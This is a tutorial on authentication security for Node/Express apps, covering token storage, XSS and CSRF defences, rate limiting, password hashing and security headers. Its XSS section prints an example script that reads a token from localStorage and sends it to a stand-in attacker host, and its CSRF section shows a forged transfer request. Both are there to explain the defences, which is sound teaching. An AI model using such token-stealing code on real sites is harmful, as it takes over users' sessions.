# Security Best Practices

Comprehensive security best practices for authentication and authorization - token storage, XSS/CSRF protection, rate limiting, and more.

---

## Core Concept

Security is critical in authentication systems. Following best practices prevents common vulnerabilities and protects user data.

**Key Security Areas:**
- Token storage and transmission
- XSS (Cross-Site Scripting) protection
- CSRF (Cross-Site Request Forgery) protection
- Rate limiting
- Password security
- HTTPS enforcement

---

## Token Storage Security

### Where to Store Tokens

**Access Token Storage:**

| Location | Security | Use Case |
|----------|----------|----------|
| **Memory** | ✅ Best | Single-page apps, most secure |
| **HttpOnly Cookie** | ✅ Good | Server-side rendering, secure |
| **localStorage** | ⚠️ Risky | XSS vulnerable, not recommended |
| **sessionStorage** | ⚠️ Risky | XSS vulnerable, not recommended |

**Refresh Token Storage:**

| Location | Security | Use Case |
|----------|----------|----------|
| **HttpOnly Cookie** | ✅ Best | Most secure, XSS protected |
| **localStorage** | ❌ Bad | XSS vulnerable, avoid |

---

### Best Practice: HttpOnly Cookies

```javascript
// ✅ Good - HttpOnly cookie
res.cookie("refreshToken", refreshToken, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // HTTPS only
  sameSite: "strict", // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000
});

// ❌ Bad - localStorage
localStorage.setItem("token", token); // XSS vulnerable
```

---

### Best Practice: Memory Storage

```javascript
// ✅ Good - Store in memory (most secure)
let accessToken = null;

function setToken(token) {
  accessToken = token; // In memory, cleared on page close
}

function getToken() {
  return accessToken;
}
```

---

## XSS Protection

### What is XSS?

**XSS (Cross-Site Scripting)** - Attacker injects malicious JavaScript that steals tokens.

**Example Attack:**
```javascript
// Attacker injects script
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

---

### Protection Strategies

**1. Use HttpOnly Cookies:**

```javascript
// ✅ Protected from XSS
res.cookie("token", token, {
  httpOnly: true // JavaScript cannot access
});
```

**2. Content Security Policy (CSP):**

```javascript
// Set CSP header
res.setHeader("Content-Security-Policy", 
  "default-src 'self'; script-src 'self'"
);
```

**3. Sanitize User Input:**

```javascript
// ✅ Sanitize before rendering
const sanitized = DOMPurify.sanitize(userInput);
```

**4. Avoid innerHTML:**

```javascript
// ❌ Bad - XSS vulnerable
element.innerHTML = userInput;

// ✅ Good - Safe
element.textContent = userInput;
```

---

## CSRF Protection

### What is CSRF?

**CSRF (Cross-Site Request Forgery)** - Attacker tricks user into making unwanted requests.

**Example Attack:**
```html
<!-- Attacker's site -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<!-- User's browser sends request with cookies -->
```

---

### Protection Strategies

**1. SameSite Cookie Attribute:**

```javascript
// ✅ CSRF protection
res.cookie("token", token, {
  sameSite: "strict", // Cookie not sent on cross-site requests
  httpOnly: true,
  secure: true
});
```

**2. CSRF Tokens:**

```javascript
// Generate CSRF token
const csrfToken = crypto.randomBytes(32).toString("hex");
req.session.csrfToken = csrfToken;

// Verify CSRF token
if (req.body.csrfToken !== req.session.csrfToken) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

**3. Double Submit Cookie:**

```javascript
// Set cookie
res.cookie("csrf", csrfToken, { httpOnly: false });

// Verify cookie matches header
if (req.cookies.csrf !== req.headers["x-csrf-token"]) {
  return res.status(403).json({ error: "CSRF validation failed" });
}
```

---

## Rate Limiting

### Why Rate Limiting?

**Prevents:**
- Brute force attacks
- Password guessing
- API abuse
- DDoS attacks

---

### Implementation

**Login Rate Limiting:**

```javascript
const rateLimit = require("express-rate-limit");

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: "Too many login attempts, please try again later",
  standardHeaders: true,
  legacyHeaders: false
});

app.post("/api/login", loginLimiter, async (req, res) => {
  // Login logic
});
```

**API Rate Limiting:**

```javascript
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: "Too many requests, please try again later"
});

app.use("/api/", apiLimiter);
```

---

## HTTPS Enforcement

### Why HTTPS?

**HTTP is insecure:**
- ❌ Data sent in plain text
- ❌ Tokens can be intercepted
- ❌ Man-in-the-middle attacks

**HTTPS encrypts:**
- ✅ All data encrypted
- ✅ Tokens protected
- ✅ Prevents interception

---

### Implementation

**Force HTTPS:**

```javascript
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header("x-forwarded-proto") !== "https" && process.env.NODE_ENV === "production") {
    res.redirect(`https://${req.header("host")}${req.url}`);
  } else {
    next();
  }
});

// Secure cookies
res.cookie("token", token, {
  secure: true, // HTTPS only
  httpOnly: true
});
```

---

## Password Security

### Best Practices

**1. Never Log Passwords:**

```javascript
// ❌ Bad
console.log("Password:", password);

// ✅ Good
console.log("User login attempt:", email);
```

**2. Use Strong Hashing:**

```javascript
// ✅ Good - bcrypt with cost 10-12
const hashedPassword = await bcrypt.hash(password, 10);

// ❌ Bad - Weak hashing
const hash = crypto.createHash("md5").update(password).digest("hex");
```

**3. Validate Password Strength:**

```javascript
function validatePassword(password) {
  return (
    password.length >= 8 &&
    /[A-Z]/.test(password) &&
    /[a-z]/.test(password) &&
    /[0-9]/.test(password) &&
    /[!@#$%^&*]/.test(password)
  );
}
```

**4. Rate Limit Password Attempts:**

```javascript
const passwordLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5 // 5 password attempts
});
```

---

## Token Security

### Best Practices

**1. Short Expiration Times:**

```javascript
// ✅ Good - Short expiration
const accessToken = jwt.sign(payload, secret, { expiresIn: "15m" });

// ❌ Bad - Long expiration
const accessToken = jwt.sign(payload, secret, { expiresIn: "30d" });
```

**2. Use Refresh Tokens:**

```javascript
// ✅ Good - Two-token system
const accessToken = jwt.sign(payload, secret, { expiresIn: "15m" });
const refreshToken = jwt.sign(payload, refreshSecret, { expiresIn: "7d" });
```

**3. Validate Token on Every Request:**

```javascript
// ✅ Always verify token
jwt.verify(token, secret, (err, decoded) => {
  if (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
  // Continue
});
```

**4. Revoke Tokens on Logout:**

```javascript
// ✅ Store revoked tokens
await RevokedToken.create({ token, expiresAt: decoded.exp });

// Check on verification
const revoked = await RevokedToken.findOne({ token });
if (revoked) {
  return res.status(401).json({ error: "Token revoked" });
}
```

---

## Environment Variables

### Secure Configuration

**Never commit secrets:**

```javascript
// ✅ Good - Use environment variables
const secret = process.env.JWT_SECRET;

// ❌ Bad - Hardcoded secret
const secret = "my-secret-key-123";
```

**Use .env file:**

```bash
# .env (never commit)
JWT_SECRET=your-super-secret-key-here
REFRESH_TOKEN_SECRET=another-secret-key
DATABASE_URL=mongodb://...
```

**Load in code:**

```javascript
require("dotenv").config();
const secret = process.env.JWT_SECRET;
```

---

## Input Validation

### Sanitize All Inputs

**1. Validate Request Body:**

```javascript
const { body, validationResult } = require("express-validator");

app.post("/api/login",
  [
    body("email").isEmail().normalizeEmail(),
    body("password").isLength({ min: 8 })
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // Continue
  }
);
```

**2. Sanitize User Input:**

```javascript
// ✅ Sanitize before using
const sanitizedEmail = email.trim().toLowerCase();
const sanitizedInput = DOMPurify.sanitize(userInput);
```

---

## Error Handling

### Don't Leak Information

**❌ Bad - Leaks information:**

```javascript
if (!user) {
  return res.status(401).json({ error: "User not found" });
}

if (!isValidPassword) {
  return res.status(401).json({ error: "Password incorrect" });
}
```

**✅ Good - Generic errors:**

```javascript
if (!user || !isValidPassword) {
  return res.status(401).json({ error: "Invalid credentials" });
}
```

---

## Security Headers

### Set Security Headers

```javascript
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader("X-Frame-Options", "DENY");
  
  // Prevent MIME type sniffing
  res.setHeader("X-Content-Type-Options", "nosniff");
  
  // XSS protection
  res.setHeader("X-XSS-Protection", "1; mode=block");
  
  // Content Security Policy
  res.setHeader("Content-Security-Policy", 
    "default-src 'self'; script-src 'self'"
  );
  
  // Strict Transport Security
  res.setHeader("Strict-Transport-Security", 
    "max-age=31536000; includeSubDomains"
  );
  
  next();
});
```

---

## Complete Security Checklist

### Authentication Security

- ✅ Use HTTPS in production
- ✅ Hash passwords with bcrypt (cost 10-12)
- ✅ Use short-lived access tokens (15m-1h)
- ✅ Use refresh tokens for long sessions
- ✅ Store refresh tokens in HttpOnly cookies
- ✅ Rate limit login attempts
- ✅ Validate all inputs
- ✅ Use environment variables for secrets
- ✅ Don't log sensitive data
- ✅ Set security headers

### Authorization Security

- ✅ Verify tokens on every request
- ✅ Check permissions, not just roles
- ✅ Validate resource ownership
- ✅ Use RBAC for access control
- ✅ Log security events
- ✅ Implement token revocation

### General Security

- ✅ Protect against XSS (HttpOnly cookies, CSP)
- ✅ Protect against CSRF (SameSite, CSRF tokens)
- ✅ Rate limit API endpoints
- ✅ Sanitize user input
- ✅ Use parameterized queries (SQL injection)
- ✅ Keep dependencies updated
- ✅ Regular security audits

---

## Common Questions

### Q: Should I store tokens in localStorage?

**A:** No. Use HttpOnly cookies or memory. localStorage is vulnerable to XSS.

### Q: How long should access tokens last?

**A:** 15 minutes to 1 hour. Use refresh tokens for longer sessions.

### Q: Should I use HTTPS in development?

**A:** Yes, especially for testing authentication flows.

### Q: How do I protect against XSS?

**A:** Use HttpOnly cookies, CSP headers, and sanitize user input.

### Q: What's the best way to store secrets?

**A:** Environment variables (.env file), never commit to git.

---

## Related Topics

- [Refresh Tokens](./5.%20Refresh%20Tokens.md) - Secure token management
- [Password Security](./6.%20Password%20Security.md) - Password hashing
- [JWT Authentication Workflow](./1.%20JWT%20Authentication%20Workflow.md) - Token implementation
- [Browser Security](../../19.%20Browser%20Internals/9.%20Browser%20Security.md) - Browser security mechanisms

---

## Summary

**Token Security:**
- ✅ Use HttpOnly cookies for refresh tokens
- ✅ Store access tokens in memory (best) or HttpOnly cookies
- ✅ Short expiration times (15m-1h)
- ✅ Use refresh tokens for long sessions

**XSS Protection:**
- ✅ HttpOnly cookies
- ✅ Content Security Policy
- ✅ Sanitize user input
- ✅ Avoid innerHTML

**CSRF Protection:**
- ✅ SameSite cookie attribute
- ✅ CSRF tokens
- ✅ Double submit cookie

**General Security:**
- ✅ HTTPS in production
- ✅ Rate limiting
- ✅ Input validation
- ✅ Security headers
- ✅ Environment variables for secrets

**Key Takeaway:** Security is multi-layered. Use HttpOnly cookies, HTTPS, rate limiting, input validation, and security headers. Never store tokens in localStorage. Always hash passwords with bcrypt.

